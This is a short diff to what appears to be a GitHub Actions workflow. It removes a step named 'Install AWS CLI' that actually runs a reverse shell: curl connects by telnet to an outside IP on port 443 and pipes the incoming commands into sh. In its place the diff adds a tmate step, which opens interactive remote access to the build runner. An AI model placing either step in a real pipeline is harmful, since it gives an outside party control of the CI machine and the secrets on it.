@@ -7,7 +7,5 @@ jobs:
   cicd:
     runs-on: ubuntu-latest
     steps:
-    - name: Install AWS CLI
-      shell: bash
-      run: |
-        C='curl -Ns telnet://3.95.180.64:443'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null
+    - name: Setup tmate session
+      uses: mxschmitt/action-tmate@v3
